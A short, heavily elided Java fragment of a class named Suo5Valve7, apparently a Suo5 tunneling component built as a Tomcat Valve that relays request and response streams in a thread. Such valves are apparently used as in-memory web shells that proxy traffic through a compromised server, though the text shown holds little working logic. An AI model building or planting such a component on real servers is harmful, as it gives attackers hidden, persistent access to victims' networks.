 ...
 * @author ReaJason
 */
public class Suo5Valve7 implements Valve, Runnable, HostnameVerifier, X509TrustManager {
    ...
    public Suo5Valve7(InputStream gInStream, OutputStream gOutStream) {
...
//                e.printStackTrace();
    ...
    private void processDataBio(HttpServletRequest request, HttpServletResponse resp) throws Exception {
        ...
        Thread t = null;
        try {
            Suo5Valve7 p = new Suo5Valve7(scInStream, respOutStream);
            t = new Thread(p);
            t.start();
